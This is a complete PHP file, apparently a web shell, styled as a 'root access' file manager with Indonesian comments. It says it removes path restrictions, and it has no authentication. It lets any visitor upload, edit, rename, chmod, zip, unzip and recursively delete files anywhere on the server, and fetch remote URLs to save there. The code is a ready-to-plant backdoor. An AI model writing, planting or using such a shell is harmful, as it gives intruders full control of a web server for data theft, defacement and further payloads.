<?php
// FILE MANAGER - ROOT ACCESS VERSION
// MOD: menghapus safe_path + mengizinkan akses full filesystem

session_start();

// --- SET BASE DIR (boleh root) ---
$base_dir = $base_dir;   // root
if (!is_dir($base_dir)) $base_dir = getcwd();

// --- Hapus safe_path, diganti fungsi bebas ---
function safe($p){
    return realpath($p) ?: $p;
}

function rrmdir($dir) {
    if (!is_dir($dir)) return;
    $items = array_diff(scandir($dir), ['.', '..']);
    foreach ($items as $it) {
        $path = $dir . '/' . $it;
        if (is_dir($path)) rrmdir($path);
        else @unlink($path);
    }
    @rmdir($dir);
}

// --- Current DIR ---
$dir = isset($_REQUEST['dir']) ? safe($_REQUEST['dir']) : safe($base_dir);

// Navigasi naik
if (isset($_GET['cd_up'])) {
    $dir = dirname($dir);
}

// Jump to
if (isset($_GET['jump_to'])) {
    $dir = safe($_GET['jump_to']);
}

// --- ACTIONS ---
$msg = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // UPLOAD
    if (isset($_FILES['upload'])) {
        if (is_array($_FILES['upload']['name'])) {
            $names = $_FILES['upload']['name'];
        } else {
            $names = [$_FILES['upload']['name']];
            $_FILES['upload']['tmp_name'] = [$_FILES['upload']['tmp_name']];
        }
        foreach ($names as $i => $nm) {
            if (!$_FILES['upload']['error'][$i]) {
                move_uploaded_file($_FILES['upload']['tmp_name'][$i], $dir.'/'.basename($nm));
            }
        }
        $msg = "Upload selesai.";
    }

    // NEW FOLDER
    if (!empty($_POST['new_folder'])) {
        @mkdir($dir.'/'.basename($_POST['new_folder']));
        $msg = "Folder dibuat.";
    }

    // EDIT FILE
    if (isset($_POST['edit_file'])) {
        file_put_contents($_POST['edit_file'], $_POST['content']);
        $msg = "File disimpan.";
        $dir = dirname($_POST['edit_file']);
    }

    // RENAME
    if (isset($_POST['rename_file'])) {
        @rename($_POST['rename_file'], dirname($_POST['rename_file']).'/'.basename($_POST['new_name']));
        $msg = "Rename selesai.";
    }

    // CHMOD
    if (isset($_POST['chmod_file'])) {
        @chmod($_POST['chmod_file'], intval($_POST['mode'],8));
        $msg = "Permission diubah.";
    }

    // DOWNLOAD URL
    if (isset($_POST['download_url'])) {
        $data = @file_get_contents($_POST['url']);
        if ($data !== false) {
            file_put_contents($dir.'/'.basename($_POST['filename']), $data);
            $msg = "Download selesai.";
        } else {
            $msg = "Gagal download URL.";
        }
    }

    // ZIP SELECTED
    if (isset($_POST['zip_create'])) {
        $zipname = $dir.'/'.basename($_POST['zip_name']);
        if (substr($zipname,-4)!=='.zip') $zipname .= '.zip';
        $zip = new ZipArchive();
        if ($zip->open($zipname, ZipArchive::CREATE|ZipArchive::OVERWRITE)) {
            if (!empty($_POST['selected'])) {
                foreach ($_POST['selected'] as $s) {
                    $p = $dir.'/'.$s;
                    if (is_file($p)) $zip->addFile($p,$s);
                    if (is_dir($p)) {
                        $it = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($p,FilesystemIterator::SKIP_DOTS)
                        );
                        foreach ($it as $f) {
                            $zip->addFile($f->getRealPath(), substr($f->getRealPath(), strlen($dir)+1));
                        }
                    }
                }
            }
            $zip->close();
        }
        $msg = "Zip selesai.";
    }

    // UNZIP
    if (isset($_POST['unzip_file'])) {
        $zf = $_POST['unzip_file'];
        $zip = new ZipArchive();
        if ($zip->open($zf)) {
            $zip->extractTo($dir);
            $zip->close();
            $msg = "Extract selesai.";
        } else $msg = "Gagal extract.";
    }

    // BULK DELETE
    if (isset($_POST['bulk_delete'])) {
        foreach ($_POST['selected'] as $s) {
            $p = $dir.'/'.$s;
            if (is_dir($p)) rrmdir($p); else @unlink($p);
        }
        $msg = "Bulk delete selesai.";
    }
}

// DELETE
if (isset($_GET['delete'])) {
    $p = $dir.'/'.$_GET['delete'];
    if (is_dir($p)) rrmdir($p); else @unlink($p);
    header("Location:?dir=".urlencode($dir)); exit;
}

// DOWNLOAD
if (isset($_GET['download'])) {
    $f = $dir.'/'.$_GET['download'];
    if (is_file($f)) {
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"".basename($f)."\"");
        header("Content-Length: ".filesize($f));
        readfile($f);
        exit;
    }
}

// FILE LIST
$items = array_values(array_diff(scandir($dir),['.','..']));
usort($items,function($a,$b)use($dir){
    $pa=$dir.'/'.$a; $pb=$dir.'/'.$b;
    if (is_dir($pa)&&!is_dir($pb)) return -1;
    if (!is_dir($pa)&&is_dir($pb)) return 1;
    return strcasecmp($a,$b);
});

function humanperm($f){
    return substr(sprintf('%o',fileperms($f)),-4);
}

// === HTML DARK HACKER THEMES ===
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>FILE MANAGER FULL ROOT</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;padding:20px}
a{color:#0f0}
.panel{background:#050;padding:10px;border:1px solid #0f0;margin-bottom:12px}
table{width:100%;border-collapse:collapse}
td,th{border-bottom:1px solid #060;padding:6px}
.drag{border:1px dashed #0f0;padding:20px;text-align:center;margin-bottom:10px}
input,button,textarea{background:#000;color:#0f0;border:1px solid #0f0;padding:5px}
</style>
<script>
function prevent(e){e.preventDefault();e.stopPropagation();}
function initDnD(){
 let z=document.getElementById("dropz");
 ["dragenter","dragover","dragleave","drop"].forEach(ev=>z.addEventListener(ev,prevent));
 z.addEventListener("drop",e=>{
   let dt=new DataTransfer();
   for(let f of e.dataTransfer.files) dt.items.add(f);
   document.getElementById("upload_input").files=dt.files;
   document.getElementById("upload_form").submit();
 });
}
window.onload=initDnD;
function toggleAll(b){ document.querySelectorAll(".sel").forEach(c=>c.checked=b.checked); }
</script>
</head>
<body>

<h2>FILE MANAGER — ROOT ACCESS</h2>
<div>Current: <b><?=htmlspecialchars($dir)?></b></div>

<a href="?dir=<?=urlencode(dirname($dir))?>">🔼 Up</a>

<?php if($msg): ?>
<div class="panel"><b><?=$msg?></b></div>
<?php endif; ?>

<!-- UPLOAD -->
<form method="post" enctype="multipart/form-data" id="upload_form" class="panel">
  <div id="dropz" class="drag">Drop files here / click</div>
  <input type="file" name="upload[]" multiple id="upload_input">
  <button>Upload</button>
</form>

<!-- NEW FOLDER / URL DOWNLOAD -->
<div class="panel">
<form method="post">
  <input name="new_folder" placeholder="New folder">
  <button>Create</button>
</form>
<br>
<form method="post">
  <input name="url" placeholder="http://...">
  <input name="filename" placeholder="save as">
  <button name="download_url">Download</button>
</form>
</div>

<!-- LIST -->
<form method="post">
<table>
<tr><th><input type="checkbox" onclick="toggleAll(this)"></th><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>

<?php
foreach($items as $it):
$full=$dir.'/'.$it;
?>
<tr>
<td><input type="checkbox" class="sel" name="selected[]" value="<?=$it?>"></td>
<td>
<?php if(is_dir($full)): ?>
<a href="?dir=<?=urlencode($full)?>">[DIR] <?=htmlspecialchars($it)?></a>
<?php else: ?>
<a href="?dir=<?=urlencode($dir)?>&download=<?=urlencode($it)?>"><?=htmlspecialchars($it)?></a>
 (<a href="?dir=<?=urlencode($dir)?>&preview=<?=urlencode($it)?>">preview</a>)
<?php endif; ?>
</td>
<td><?=is_dir($full)?'-':filesize($full)?></td>
<td><?=humanperm($full)?></td>
<td>
<a href="?dir=<?=urlencode($dir)?>&delete=<?=urlencode($it)?>" onclick="return confirm('Delete?')">del</a> |
<a href="?dir=<?=urlencode($dir)?>&rename=<?=urlencode($it)?>">rename</a> |
<a href="?dir=<?=urlencode($dir)?>&chmod=<?=urlencode($it)?>">chmod</a>
</td>
</tr>
<?php endforeach; ?>
</table>

<button name="bulk_delete" onclick="return confirm('Delete selected?')">Delete Selected</button>
<button name="zip_create">Zip Selected</button>
<input name="zip_name" placeholder="name.zip">
</form>

<!-- EXTRA PANELS -->
<div class="panel">
<?php
// PREVIEW
if (isset($_GET['preview'])) {
    $p = $dir.'/'.$_GET['preview'];
    echo "<h3>Preview:</h3>";
    echo "<pre>".htmlspecialchars(@file_get_contents($p))."</pre>";
}

// EDIT
if (isset($_GET['edit'])) {
    $p = $dir.'/'.$_GET['edit'];
    $ct = htmlspecialchars(@file_get_contents($p));
    ?>
    <h3>Edit: <?=htmlspecialchars($_GET['edit'])?></h3>
    <form method="post">
      <input type="hidden" name="edit_file" value="<?=$p?>">
      <textarea name="content" style="width:100%;height:300px"><?=$ct?></textarea>
      <button>Save</button>
    </form>
    <?php
}

// RENAME
if (isset($_GET['rename'])) {
    $p = $dir.'/'.$_GET['rename'];
    ?>
    <h3>Rename: <?=htmlspecialchars($_GET['rename'])?></h3>
    <form method="post">
      <input type="hidden" name="rename_file" value="<?=$p?>">
      <input name="new_name" value="<?=htmlspecialchars($_GET['rename'])?>">
      <button>Rename</button>
    </form>
    <?php
}

// CHMOD
if (isset($_GET['chmod'])) {
    $p = $dir.'/'.$_GET['chmod'];
    ?>
    <h3>CHMOD: <?=htmlspecialchars($_GET['chmod'])?></h3>
    <form method="post">
      <input type="hidden" name="chmod_file" value="<?=$p?>">
      <input name="mode" placeholder="0755">
      <button>Apply</button>
    </form>
    <?php
}
?>
</div>

</body>
</html>
